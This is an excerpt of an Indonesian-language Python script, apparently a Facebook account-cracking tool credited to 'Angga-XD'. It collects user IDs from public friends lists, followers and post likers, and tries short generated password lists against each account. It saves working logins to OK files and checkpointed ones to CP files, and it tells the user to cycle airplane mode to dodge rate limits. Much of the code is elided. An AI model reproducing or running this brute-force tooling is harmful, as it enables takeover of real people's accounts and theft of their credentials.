...
def banner():
    print("\n%s    _________ __     \n%s   / ____/ (_) /____  ║ %sRecode By %sAngga%s-%sXD\n%s  / __/ / / / __/ _ \ ║ %sFB       %s: %sFacebook.com/AnggaXD13\n%s / /___/ / / /_/  __/ ║ %sYouTube  %s: %sAngga-XD\n%s/_____/_/_/\__/\___/  ║ %sGithub   %s: %sGithub.com/AnggaXD13\n"%(O,O,P,O,P,O,O,P,O,P,O,P,O,P,O,P,O,P))
def menu_log():
    ...
    if pmu in ['']:
        ...
        try:
            ...
            print('%s║'%(O))
            jalan('%s╚══[%s!%s] %sMasalah Jaringan'%(M,P,M,P))
            exit()
...
def menu():
    ...
    try:
        ...
        print('%s║'%(M))
        jalan('%s╚══[%s!%s] %sToken/Cookies Kadaluwarsa'%(M,P,M,P))
        os.system('rm -rf token.txt')
        menu_log()
    except requests.exceptions.ConnectionError:
        print('%s╔══[ %sOh %s]%s'%(M,P,M,P))
        ...
        jalan('%s╚══[%s!%s] %sMasalah Jaringan'%(M,P,M,P))
        exit()
    a = requests.get("http://ip-api.com/json/",headers={"Referer":"http://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; U; Android 8.1.0; in-id; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 HeyTapBrowser/15.8.2.1"}).json()
    try:
        ip = a["query"]
    except KeyError:
        ip = " "
    ...
    print('%s║'%(O))
    print('%s╠══[%s1%s] %sCrack Dari Teman Publik %s'%(O,P,O,P,jid))
    print('%s╠══[%s2%s] %sCrack Dari Followers %s'%(O,P,O,P,jid))
    print('%s╠══[%s3%s] %sCrack Dari Like Postingan %s'%(O,P,O,P,jid))
    ...
    print('%s╠══[%s7%s] %sCek Opsi Akun Checkpoin %s'%(O,P,O,P,pro))
    print('%s╠══[%s8%s] %sSetting User Agent'%(O,P,O,P))
...
def ugen():
    ...
    if pmu in[""]:
        ...
        try:
            ...
            jalan("\n%s╔══[ %sGagal Mengubah User Agent %s]"%(M,P,M))
            print('%s║'%(M))
...
def publik():
    ...
    try:
        ...
        exit()
    try:
        print('%s╠══[%s•%s] %sKetik Me Untuk Crack Teman Sendiri'%(O,P,O,P))
...
def generate2(_cici_):
    ...
    _dapunta_.append("freefire")
    _dapunta_.append("kontol")
    _dapunta_.append("cantik")
            ...
            if f=="":
                ...
                try:
                    ...
                    if put in ['']:
                        ...
                        print('%s╠══[%s•%s] %sMunculkan Opsi Checkpoin? [y/t]'%(O,P,O,P))
            ...
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    try:
                        ...
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        print("\r%s[%sAngga%s] %s • %s • %s %s %s%s"%(O,P,O,fl.get("id"),i,d,m,y,tahun(fl.get("id"))))
                    ...
                    print("\r%s[%Angga%s] %s • %s%s     "%(O,P,O,fl.get("id"),i,tahun(fl.get("id"))))
        ...
        try:
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    ...
                    print("\r%s[%sAngga%s] %s • %s%s     "%(O,P,O,fl.get("id"),i,tahun(fl.get("id"))))
                    self.cp.append("%s•%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    print("\r%s[%sAngga%s] %s • %s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id"))))
                    print("")
                    self.ada.append("%s•%s"%(fl.get("id"),i))
                    open("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
        ...
        try:
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    ...
                    h_ok = "\r%s[%sAngga%s] %s • %s%s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id")),P)
            ...
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    try:
                        ...
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        h_cp = "\r%s[%sAngga%s] %s • %s • %s %s %s%s"%(O,P,O,fl.get("id"),i,d,m,y,tahun(fl.get("id")))
                    ...
                    h_cp = "\r%s[%sAngga%s] %s • %s%s     "%(O,P,O,fl.get("id"),i,tahun(fl.get("id")))
                    cek_log(fl.get("id"),i,h_cp)
                    print("")
                    self.cp.append("%s•%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
...
def target():
    ...
    except (KeyError,IOError):jalan('%s╚══[%s!%s] %sToken/Cookies Kadaluwarsa'%(M,P,M,P));menu_log()
...
def log_hasil(user, pasw):
    ...
    if "c_user" in ses.cookies:
        ...
        ngew = [yy.text for yy in xnxx.find_all("option")]
        if(str(len(ngew))=="0"):
            print("%s[%s•%s] %sTap Yes Nih Bos!!"%(H,P,H,P))
        else:
...
def cek_hasil():
    ...
    menu()
def var_menu():
    print('%s╔══[ %sPilih Method Login %s]'%(O,P,O))
    print('%s║'%(O))
...
def var_author():
    ...
    mlaku('%s║     • %sAang Ardiansyah-XD'%(O,P))
    mlaku('%s║'%(O))
    ...
    mlaku('%s║'%(O))
def var_ugen():
    print("%s╠══[%s1%s] %sMendapatkan User Agent"%(O,P,O,P))
...
def start_methodezz():
    print('%s║'%(O))
    print('%s╠══[%s1%s] %sCrack Cepat %s[%s6 pass%s]'%(O,P,O,P,O,P,O))
    print('%s╠══[%s2%s] %sCrack Lambat %s[%s9 pass%s]'%(O,P,O,P,O,P,O))
    print('%s╠══[%s3%s] %sCrack Sangat Lambat %s[%s12 pass%s]'%(O,P,O,P,O,P,O))
    print('%s╠══[%s4%s] %sCrack Dengan Password Gabungan'%(O,P,O,P))
def started():
    print('%s║'%(O))
    ...
    print('%s╚══[%s•%s] %sAktifkan Mode Pesawat [5 Detik] Setiap 5 Menit\n'%(O,P,O,P))
def folder():
    try:os.mkdir("CP")
    except:pass
    try:os.mkdir("OK")
